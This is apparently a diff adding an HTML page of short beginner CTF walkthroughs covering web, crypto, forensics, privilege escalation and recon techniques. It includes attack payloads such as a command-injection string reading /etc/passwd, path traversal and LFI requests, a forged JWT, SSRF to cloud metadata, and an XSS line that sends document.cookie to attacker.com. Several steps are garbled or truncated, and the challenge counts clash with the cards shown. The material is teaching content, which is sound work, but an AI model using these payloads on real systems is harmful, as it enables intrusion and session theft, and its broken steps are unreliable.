@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Daily Digest — CTF Writeups</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0d1117; color: #e6edf3; line-height: 1.6; }
+    .container { max-width: 900px; margin: 0 auto; padding: 1.5rem 1rem; }
+    header { display: flex; align-items: center; gap: 1rem; margin-bottom: 2rem; padding-bottom: 1rem; border-bottom: 1px solid #21262d; flex-wrap: wrap; }
+    .back-btn { background: #21262d; color: #58a6ff; padding: 0.4rem 1rem; border-radius: 6px; text-decoration: none; font-size: 0.85rem; border: 1px solid #30363d; flex-shrink: 0; }
+    .back-btn:hover { background: #30363d; }
+    h1 { color: #3fb950; font-size: 1.5rem; }
+    .subtitle { color: #8b949e; font-size: 0.85rem; margin-left: auto; }
+    .summary-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 0.75rem; margin-bottom: 2rem; }
+    .summary-card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 1rem; text-align: center; }
+    .summary-card .num { font-size: 2rem; font-weight: bold; color: #58a6ff; }
+    .summary-card .label { color: #8b949e; font-size: 0.8rem; margin-top: 0.25rem; }
+    .category-filter { display: flex; gap: 0.5rem; flex-wrap: wrap; margin-bottom: 1.5rem; }
+    .filter-btn { background: #161b22; color: #8b949e; border: 1px solid #30363d; border-radius: 20px; padding: 0.3rem 0.9rem; font-size: 0.8rem; cursor: pointer; text-decoration: none; }
+    .filter-btn:hover, .filter-btn.active { background: #1f6feb22; color: #58a6ff; border-color: #1f6feb66; }
+    .writeup-card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; margin-bottom: 1rem; overflow: hidden; }
+    .writeup-header { padding: 1rem 1.25rem; cursor: pointer; display: flex; justify-content: space-between; align-items: center; }
+    .writeup-header:hover { background: #1c2128; }
+    .writeup-title { font-weight: bold; font-size: 1rem; color: #c9d1d9; }
+    .writeup-meta { display: flex; gap: 0.5rem; align-items: center; margin-top: 0.3rem; flex-wrap: wrap; }
+    .cat-chip { font-size: 0.75rem; padding: 0.15rem 0.5rem; border-radius: 20px; font-weight: 500; }
+    .diff-badge { font-size: 0.7rem; padding: 0.1rem 0.4rem; border-radius: 20px; }
+    .toggle-icon { color: #58a6ff; font-size: 1.2rem; transition: transform 0.2s; }
+    .writeup-header.expanded .toggle-icon { transform: rotate(180deg); }
+    .writeup-body { display: none; padding: 1.25rem; border-top: 1px solid #30363d; }
+    .writeup-body.open { display: block; }
+    .desc { color: #8b949e; font-size: 0.9rem; margin-bottom: 1rem; }
+    .step-label { color: #f0883e; font-weight: bold; font-size: 0.8rem; margin: 1rem 0 0.5rem; text-transform: uppercase; letter-spacing: 0.05em; }
+    .step-list { list-style: none; padding: 0; }
+    .step-list li { padding: 0.4rem 0; border-bottom: 1px solid #21262d; color: #c9d1d9; font-size: 0.88rem; }
+    .step-list li:last-child { border-bottom: none; }
+    .step-list li::before { content: "→ "; color: #3fb950; }
+    .tip-box { background: #1a2e1a; border: 1px solid #3fb95044; border-radius: 6px; padding: 0.75rem 1rem; margin-top: 0.75rem; }
+    .tip-box .tip-label { color: #3fb950; font-weight: bold; font-size: 0.8rem; }
+    .tip-box p { color: #8b949e; font-size: 0.85rem; margin-top: 0.3rem; }
+    .footer-note { text-align: center; color: #484f58; font-size: 0.8rem; margin-top: 2rem; padding-top: 1rem; border-top: 1px solid #21262d; }
+    @media (max-width: 600px) { .subtitle { margin-left: 0; width: 100%; } .summary-grid { grid-template-columns: 1fr 1fr; } }
+  </style>
+</head>
+<body>
+<div class="container">
+<header>
+  <a class="back-btn" href="index.html">Home</a>
+  <h1>CTF Writeups</h1>
+  <span class="subtitle">19 challenges · Crypto, Web, Forensics, Network</span>
+</header>
+
+<div class="summary-grid">
+  <div class="summary-card"><div class="num">19</div><div class="label">Challenges</div></div>
+  <div class="summary-card"><div class="num">16</div><div class="label">Easy</div></div>
+  <div class="summary-card"><div class="num">3</div><div class="label">Medium</div></div>
+  <div class="summary-card"><div class="num">6</div><div class="label">Categories</div></div>
+</div>
+
+<div class="category-filter">
+  <a class="filter-btn active" href="#" onclick="filterAll()">All</a>
+  <a class="filter-btn" href="#" onclick="filterCat('Web')">Web</a>
+  <a class="filter-btn" href="#" onclick="filterCat('Crypto')">Crypto</a>
+  <a class="filter-btn" href="#" onclick="filterCat('Forensics')">Forensics</a>
+  <a class="filter-btn" href="#" onclick="filterCat('Network')">Network</a>
+  <a class="filter-btn" href="#" onclick="filterCat('Binary')">Binary</a>
+  <a class="filter-btn" href="#" onclick="filterCat('Misc')">Misc</a>
+</div>
+
+<div class="writeup-card" data-category="Binary / Pwn">
+  <div class="writeup-header" onclick="toggleWriteup(this)">
+    <div>
+      <div class="writeup-title">Buffer Overflow \u2014 Overwriting a Variable</div>
+      <div class="writeup-meta">
+        <span class="cat-chip" style="background:#ff7b7222;color:#ff7b72;border:1px solid #ff7b7244">Binary / Pwn</span>
+        <span class="diff-badge" style="background:#3fb95022;color:#3fb950;border:1px solid #3fb95044">Easy</span>
+      </div>
+    </div>
+    <div class="toggle-icon">▼</div>
+  </div>
+  <div class="writeup-body">
+    <p class="desc">A program stores user input in a fixed-size buffer. Send more data than expected \u2192 overflow into adjacent memory.</p>
+    <div class="step-label">Steps</div>
+    <ol class="step-list"><li>1. Program expects max 16 chars</li>
+<li>2. Send 32 A's \u2014 it prints 'Authenticated: 1'</li>
+<li>3. Overflow overwrote the 'authenticated' flag from 0 to 1</li>
+<li>4. You bypassed authentication without any password!</li></ol>
+    
+  </div>
+</div>
+
+<div class="writeup-card" data-category="Crypto">
+  <div class="writeup-header" onclick="toggleWriteup(this)">
+    <div>
+      <div class="writeup-title">ROT13 Caesar Cipher</div>
+      <div class="writeup-meta">
+        <span class="cat-chip" style="background:#a371f722;color:#a371f7;border:1px solid #a371f744">Crypto</span>
+        <span class="diff-badge" style="background:#3fb95022;color:#3fb950;border:1px solid #3fb95044">Easy</span>
+      </div>
+    </div>
+    <div class="toggle-icon">▼</div>
+  </div>
+  <div class="writeup-body">
+    <p class="desc">The oldest encryption — shift every letter by 13 places. Apply it twice and you get the original back.</p>
+    <div class="step-label">Steps</div>
+    <ol class="step-list"><li>1. Encoded flag: cvpbPGS{abg_yrgvxravb}</li>
+<li>2. It's ROT13 \u2014 known simple cipher</li>
+<li>3. Decode: echo 'cvpbPGS{abg_yrgvxravb}' | tr 'A-Za-z' 'N-ZA-Mn-za-m'</li>
+<li>4. Result: puzzle{another_caesarcipher}</li></ol>
+    
+  </div>
+</div>
+
+<div class="writeup-card" data-category="Forensics">
+  <div class="writeup-header" onclick="toggleWriteup(this)">
+    <div>
+      <div class="writeup-title">Hidden Data in Image (Steganography)</div>
+      <div class="writeup-meta">
+        <span class="cat-chip" style="background:#3fb95022;color:#3fb950;border:1px solid #3fb95044">Forensics</span>
+        <span class="diff-badge" style="background:#3fb95022;color:#3fb950;border:1px solid #3fb95044">Easy</span>
+      </div>
+    </div>
+    <div class="toggle-icon">▼</div>
+  </div>
+  <div class="writeup-body">
+    <p class="desc">Secret data can be hidden inside image files via EXIF metadata or pixel modifications.</p>
+    <div class="step-label">Steps</div>
+    <ol class="step-list"><li>1. strings photo.jpg | grep -i flag</li>
+<li>2. exiftool photo.jpg (EXIF metadata)</li>
+<li>3. steghide extract -sf photo.jpg (if password protected)</li>
+<li>4. zsteg photo.png (for PNG LSB)</li>
+<li>5. Found: flag{w3ll_h1dd3n}</li></ol>
+    
+  </div>
+</div>
+
+<div class="writeup-card" data-category="Web">
+  <div class="writeup-header" onclick="toggleWriteup(this)">
+    <div>
+      <div class="writeup-title">Path Traversal / Directory Traversal</div>
+      <div class="writeup-meta">
+        <span class="cat-chip" style="background:#f0883e22;color:#f0883e;border:1px solid #f0883e44">Web</span>
+        <span class="diff-badge" style="background:#3fb95022;color:#3fb950;border:1px solid #3fb95044">Easy</span>
+      </div>
+    </div>
+    <div class="toggle-icon">▼</div>
+  </div>
+  <div class="writeup-body">
+    <p class="desc">A web app reads files based on user input without path validation. You can escape the intended directory.</p>
+    <div class="step-label">Steps</div>
+    <ol class="step-list"><li>1. URL: /read?file=report.pdf</li>
+<li>2. Try: /read?file=../../etc/passwd</li>
+<li>3. '..' goes up one directory</li>
+<li>4. ../../etc/passwd \u2192 webroot \u2192 / \u2192 etc/passwd</li>
+<li>5. Server shows the passwd file!</li></ol>
+    
+  </div>
+</div>
+
+<div class="writeup-card" data-category="Web / Auth">
+  <div class="writeup-header" onclick="toggleWriteup(this)">
+    <div>
+      <div class="writeup-title">JWT Token Tampering</div>
+      <div class="writeup-meta">
+        <span class="cat-chip" style="background:#f0883e22;color:#f0883e;border:1px solid #f0883e44">Web / Auth</span>
+        <span class="diff-badge" style="background:#3fb95022;color:#3fb950;border:1px solid #3fb95044">Easy</span>
+      </div>
+    </div>
+    <div class="toggle-icon">▼</div>
+  </div>
+  <div class="writeup-body">
+    <p class="desc">JWT has 3 parts: header.payload.signature. If server accepts 'none' algorithm, you can forge tokens.</p>
+    <div class="step-label">Steps</div>
+    <ol class="step-list"><li>1. JWT: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QifQ.</li>
+<li>2. Decode header: {\</li>
+<li>:\</li>
+<li>} \u2014 no signature needed!</li>
+<li>3. Change payload to: {\</li>
+<li>:\</li>
+<li>}</li>
+<li>4. Encode back: header.payload. (empty signature)</li>
+<li>5. Send \u2014 you get admin access!</li></ol>
+    
+  </div>
+</div>
+
+<div class="writeup-card" data-category="Web / Network">
+  <div class="writeup-header" onclick="toggleWriteup(this)">
+    <div>
+      <div class="writeup-title">Ping Command Injection</div>
+      <div class="writeup-meta">
+        <span class="cat-chip" style="background:#f0883e22;color:#f0883e;border:1px solid #f0883e44">Web / Network</span>
+        <span class="diff-badge" style="background:#3fb95022;color:#3fb950;border:1px solid #3fb95044">Easy</span>
+      </div>
+    </div>
+    <div class="toggle-icon">▼</div>
+  </div>
+  <div class="writeup-body">
+    <p class="desc">A form takes an IP and runs: ping <ip>. Inject shell commands and the application executes them.</p>
+    <div class="step-label">Steps</div>
+    <ol class="step-list"><li>1. Form sends: ip=8.8.8.8 \u2192 server: ping 8.8.8.8</li>
+<li>2. Try: ip=8.8.8.8; ls (inject second command)</li>
+<li>3. Server runs: ping 8.8.8.8; ls \u2014 directory listing!</li>
+<li>4. Try: ip=8.8.8.8; cat /etc/passwd</li>
+<li>5. Full remote code execution!</li></ol>
+    
+  </div>
+</div>
+
+<div class="writeup-card" data-category="Crypto / Misc">
+  <div class="writeup-header" onclick="toggleWriteup(this)">
+    <div>
+      <div class="writeup-title">Base64 Encoding Trap</div>
+      <div class="writeup-meta">
+        <span class="cat-chip" style="background:#a371f722;color:#a371f7;border:1px solid #a371f744">Crypto / Misc</span>
+        <span class="diff-badge" style="background:#3fb95022;color:#3fb950;border:1px solid #3fb95044">Easy</span>
+      </div>
+    </div>
+    <div class="toggle-icon">▼</div>
+  </div>
+  <div class="writeup-body">
+    <p class="desc">Base64 is NOT encryption — it's just encoding. Encrypted data looks like random Base64. Encoded data can be decoded by anyone.</p>
+    <div class="step-label">Steps</div>
+    <ol class="step-list"><li>1. String: RmxhZ3tZMHVfMG5seV9kZWNvZGV9</li>
+<li>2. Looks like gibberish \u2014 must be encrypted?</li>
+<li>3. Try: echo 'RmxhZ3tZMHVfMG5seV9kZWNvZGV9' | base64 -d</li>
+<li>4. Output: Flag{Y0u_0nly_decode}</li>
+<li>5. It was just Base64!</li></ol>
+    
+  </div>
+</div>
+
+<div class="writeup-card" data-category="Misc / Forensics">
+  <div class="writeup-header" onclick="toggleWriteup(this)">
+    <div>
+      <div class="writeup-title">Zip Password Crack (John the Ripper)</div>
+      <div class="writeup-meta">
+        <span class="cat-chip" style="background:#3fb95022;color:#3fb950;border:1px solid #3fb95044">Misc / Forensics</span>
+        <span class="diff-badge" style="background:#3fb95022;color:#3fb950;border:1px solid #3fb95044">Easy</span>
+      </div>
+    </div>
+    <div class="toggle-icon">▼</div>
+  </div>
+  <div class="writeup-body">
+    <p class="desc">A password-protected ZIP contains the flag. Use zip2john to extract the hash, then crack with a wordlist.</p>
+    <div class="step-label">Steps</div>
+    <ol class="step-list"><li>1. Extract hash: zip2john secret.zip > hash.txt</li>
+<li>2. Crack: john --wordlist=rockyou.txt hash.txt</li>
+<li>3. John finds password: 'letmein'</li>
+<li>4. unzip -P letmein secret.zip \u2192 flag.txt extracted!</li></ol>
+    
+  </div>
+</div>
+
+<div class="writeup-card" data-category="Web / Recon">
+  <div class="writeup-header" onclick="toggleWriteup(this)">
+    <div>
+      <div class="writeup-title">Git History Leak</div>
+      <div class="writeup-meta">
+        <span class="cat-chip" style="background:#f0883e22;color:#f0883e;border:1px solid #f0883e44">Web / Recon</span>
+        <span class="diff-badge" style="background:#3fb95022;color:#3fb950;border:1px solid #3fb95044">Easy</span>
+      </div>
+    </div>
+    <div class="toggle-icon">▼</div>
+  </div>
+  <div class="writeup-body">
+    <p class="desc">The .git folder is exposed on the web server, revealing all git history, old commits, deleted files.</p>
+    <div class="step-label">Steps</div>
+    <ol class="step-list"><li>1. Visit: https://example.com/.git/</li>
+<li>2. Download the whole .git directory</li>
+<li>3. Run: git log (all commits)</li>
+<li>4. Run: git diff HEAD~1 (what changed)</li>
+<li>5. Found config.py with database credentials in old commit!</li></ol>
+    
+  </div>
+</div>
+
+<div class="writeup-card" data-category="Web">
+  <div class="writeup-header" onclick="toggleWriteup(this)">
+    <div>
+      <div class="writeup-title">XSS \u2014 Cross-Site Scripting</div>
+      <div class="writeup-meta">
+        <span class="cat-chip" style="background:#f0883e22;color:#f0883e;border:1px solid #f0883e44">Web</span>
+        <span class="diff-badge" style="background:#3fb95022;color:#3fb950;border:1px solid #3fb95044">Easy</span>
+      </div>
+    </div>
+    <div class="toggle-icon">▼</div>
+  </div>
+  <div class="writeup-body">
+    <p class="desc">A website reflects user input without sanitizing. You can inject JavaScript that runs in other users' browsers.</p>
+    <div class="step-label">Steps</div>
+    <ol class="step-list"><li>1. Find an input field (comment box, search bar)</li>
+<li>2. Try: <script>alert('XSS')</script></li>
+<li>3. Submit \u2014 if it executes, site is vulnerable</li>
+<li>4. Real attack: <script>document.location='https://attacker.com/steal?c='+document.cookie</script></li>
+<li>5. You just stole every user's session cookie!</li></ol>
+    
+  </div>
+</div>
+
+<div class="writeup-card" data-category="Misc / PrivEsc">
+  <div class="writeup-header" onclick="toggleWriteup(this)">
+    <div>
+      <div class="writeup-title">Linux Privilege Escalation via Sudo</div>
+      <div class="writeup-meta">
+        <span class="cat-chip" style="background:#8b949e22;color:#8b949e;border:1px solid #8b949e44">Misc / PrivEsc</span>
+        <span class="diff-badge" style="background:#3fb95022;color:#3fb950;border:1px solid #3fb95044">Easy</span>
+      </div>
+    </div>
+    <div class="toggle-icon">▼</div>
+  </div>
+  <div class="writeup-body">
+    <p class="desc">A program runs with sudo privileges. You can exploit misconfigured sudo permissions to get root.</p>
+    <div class="step-label">Steps</div>
+    <ol class="step-list"><li>1. Check sudo permissions: sudo -l</li>
+<li>2. Find: (ALL : ALL) NOPASSWD: /usr/bin/python3</li>
+<li>3. Spawn root shell: sudo python3 -c \</li>
+<li>,
+        </li>
+<li>,
+        </li></ol>
+    
+  </div>
+</div>
+
+<div class="writeup-card" data-category="Web">
+  <div class="writeup-header" onclick="toggleWriteup(this)">
+    <div>
+      <div class="writeup-title">SSRF \u2014 Server-Side Request Forgery</div>
+      <div class="writeup-meta">
+        <span class="cat-chip" style="background:#f0883e22;color:#f0883e;border:1px solid #f0883e44">Web</span>
+        <span class="diff-badge" style="background:#3fb95022;color:#3fb950;border:1px solid #3fb95044">Easy</span>
+      </div>
+    </div>
+    <div class="toggle-icon">▼</div>
+  </div>
+  <div class="writeup-body">
+    <p class="desc">A web app fetches URLs based on user input. You can make it fetch internal resources.</p>
+    <div class="step-label">Steps</div>
+    <ol class="step-list"><li>1. URL: /fetch?url=https://google.com</li>
+<li>2. Change to: url=http://169.254.169.254/ (AWS metadata)</li>
+<li>3. Server fetches internal AWS data!</li>
+<li>4. url=/admin \u2014 bypass login via SSRF</li>
+<li>5. Full SSRF: reading internal files, cloud metadata, internal APIs</li></ol>
+    
+  </div>
+</div>
+
+<div class="writeup-card" data-category="Crypto">
+  <div class="writeup-header" onclick="toggleWriteup(this)">
+    <div>
+      <div class="writeup-title">Hash Identification and Cracking</div>
+      <div class="writeup-meta">
+        <span class="cat-chip" style="background:#a371f722;color:#a371f7;border:1px solid #a371f744">Crypto</span>
+        <span class="diff-badge" style="background:#3fb95022;color:#3fb950;border:1px solid #3fb95044">Easy</span>
+      </div>
+    </div>
+    <div class="toggle-icon">▼</div>
+  </div>
+  <div class="writeup-body">
+    <p class="desc">Find a hash, identify its type, then crack it. MD5 (32 hex), SHA1 (40 hex), SHA256 (64 hex), bcrypt ($2a$).</p>
+    <div class="step-label">Steps</div>
+    <ol class="step-list"><li>1. Hash: 5f4dcc3b5aa765d61d8327deb882cf99</li>
+<li>2. 32 hex \u2192 likely MD5</li>
+<li>3. Use: hashcat -m 0 hash.txt wordlist.txt (type 0 = MD5)</li>
+<li>4. Or: crackstation.net (fast online MD5 cracker)</li>
+<li>5. Result: password \u2192 cracked!</li></ol>
+    
+  </div>
+</div>
+
+<div class="writeup-card" data-category="Web">
+  <div class="writeup-header" onclick="toggleWriteup(this)">
+    <div>
+      <div class="writeup-title">LFI \u2014 Local File Inclusion</div>
+      <div class="writeup-meta">
+        <span class="cat-chip" style="background:#f0883e22;color:#f0883e;border:1px solid #f0883e44">Web</span>
+        <span class="diff-badge" style="background:#f0883e22;color:#f0883e;border:1px solid #f0883e44">Medium</span>
+      </div>
+    </div>
+    <div class="toggle-icon">▼</div>
+  </div>
+  <div class="writeup-body">
+    <p class="desc">A PHP app includes files based on user input without sanitization. You can read any file on the server.</p>
+    <div class="step-label">Steps</div>
+    <ol class="step-list"><li>1. URL: /page?file=contact.php</li>
+<li>2. Try: /page?file=../../../../etc/passwd</li>
+<li>3. Try: /page?file=/etc/passwd (Linux) or C:\\Windows\\System32\\drivers\\etc\\hosts (Windows)</li>
+<li>4. If PHP code executes: /page?file=php://filter/convert.base64-encode/resource=config</li>
+<li>5. Read config files, .env with secrets, source code!</li></ol>
+    
+  </div>
+</div>
+
+<div class="writeup-card" data-category="Web">
+  <div class="writeup-header" onclick="toggleWriteup(this)">
+    <div>
+      <div class="writeup-title">IDOR \u2014 Insecure Direct Object Reference</div>
+      <div class="writeup-meta">
+        <span class="cat-chip" style="background:#f0883e22;color:#f0883e;border:1px solid #f0883e44">Web</span>
+        <span class="diff-badge" style="background:#3fb95022;color:#3fb950;border:1px solid #3fb95044">Easy</span>
+      </div>
+    </div>
+    <div class="toggle-icon">▼</div>
+  </div>
+  <div class="writeup-body">
+    <p class="desc">A URL or API parameter directly references an object (like /profile?id=123). Change the ID to access other users' data.</p>
+    <div class="step-label">Steps</div>
+    <ol class="step-list"><li>1. URL: /user/profile?id=123 \u2192 shows your profile</li>
+<li>2. Change to: /user/profile?id=124</li>
+<li>3. You see someone else's profile!</li>
+<li>4. Check API responses for IDs, try to enumerate</li>
+<li>5. Found sensitive data of other users \u2014 IDOR vulnerability!</li></ol>
+    
+  </div>
+</div>
+
+<div class="writeup-card" data-category="Network / Recon">
+  <div class="writeup-header" onclick="toggleWriteup(this)">
+    <div>
+      <div class="writeup-title">DNS Zone Transfer (AXFR)</div>
+      <div class="writeup-meta">
+        <span class="cat-chip" style="background:#58a6ff22;color:#58a6ff;border:1px solid #58a6ff44">Network / Recon</span>
+        <span class="diff-badge" style="background:#3fb95022;color:#3fb950;border:1px solid #3fb95044">Easy</span>
+      </div>
+    </div>
+    <div class="toggle-icon">▼</div>
+  </div>
+  <div class="writeup-body">
+    <p class="desc">DNS zone transfer can reveal all subdomains and internal records if the DNS server is misconfigured.</p>
+    <div class="step-label">Steps</div>
+    <ol class="step-list"><li>1. Target: dns.target.com</li>
+<li>2. Try: dig axfr @dns.target.com</li>
+<li>3. Or: nslookup -type=axfr target.com dns.target.com</li>
+<li>4. If AXFR allowed: you get all DNS records</li>
+<li>5. Internal IPs, subdomain enumeration, mail servers, dev.internal.target.com revealed!</li></ol>
+    
+  </div>
+</div>
+
+<div class="writeup-card" data-category="Crypto">
+  <div class="writeup-header" onclick="toggleWriteup(this)">
+    <div>
+      <div class="writeup-title">Cracking MD5 Hash with Rainbow Tables</div>
+      <div class="writeup-meta">
+        <span class="cat-chip" style="background:#a371f722;color:#a371f7;border:1px solid #a371f744">Crypto</span>
+        <span class="diff-badge" style="background:#3fb95022;color:#3fb950;border:1px solid #3fb95044">Easy</span>
+      </div>
+    </div>
+    <div class="toggle-icon">▼</div>
+  </div>
+  <div class="writeup-body">
+    <p class="desc">MD5 hashes can be cracked by comparing them against pre-computed tables (rainbow tables) or online databases.</p>
+    <div class="step-label">Steps</div>
+    <ol class="step-list"><li>1. Hash: e10adc3949ba59abbe56e057f20f883e</li>
+<li>2. Try: crackstation.net, hashkiller.com, md5decrypt.net</li>
+<li>3. All return: 123456 (one of the most common passwords)</li>
+<li>4. MD5 is broken \u2014 fast to compute, easy to crack</li>
+<li>5. Never use MD5 for passwords. Use bcrypt, scrypt, or Argon2 instead.</li></ol>
+    
+  </div>
+</div>
+
+<div class="writeup-card" data-category="Web / Auth">
+  <div class="writeup-header" onclick="toggleWriteup(this)">
+    <div>
+      <div class="writeup-title">Broken Authentication \u2014 Weak Session Tokens</div>
+      <div class="writeup-meta">
+        <span class="cat-chip" style="background:#f0883e22;color:#f0883e;border:1px solid #f0883e44">Web / Auth</span>
+        <span class="diff-badge" style="background:#f0883e22;color:#f0883e;border:1px solid #f0883e44">Medium</span>
+      </div>
+    </div>
+    <div class="toggle-icon">▼</div>
+  </div>
+  <div class="writeup-body">
+    <p class="desc">Session tokens are predictable (sequential, timestamp-based, or time-based). Predict the token and hijack sessions.</p>
+    <div class="step-label">Steps</div>
+    <ol class="step-list"><li>1. Log in twice, get two tokens: session1=abc123, session2=abc456</li>
+<li>3. Pattern: sequential numbers \u2192 predict next token: abc789</li>
+<li>4. Send request with Cookie: session=abc789</li>
+<li>5. You're logged in as the next user!</li></ol>
+    
+  </div>
+</div>
+
+<div class="footer-note">One new writeup added daily · New challenges every day</div>
+</div>
+
+<script>
+function toggleWriteup(el){el.nextElementSibling.classList.toggle('open');el.classList.toggle('expanded');}
+function filterCat(cat){document.querySelectorAll('.writeup-card').forEach(c=>{c.style.display=cat&&!c.dataset.category.includes(cat)?'none':'block';});document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));event.target.classList.add('active');}
+function filterAll(){document.querySelectorAll('.writeup-card').forEach(c=>c.style.display='block');document.querySelectorAll('.filter-btn').forEach(b=>b.classList.remove('active'));document.querySelector('.filter-btn').classList.add('active');}
+document.querySelectorAll('.writeup-header')[0].click();
+</script>
+</body>
+</html>
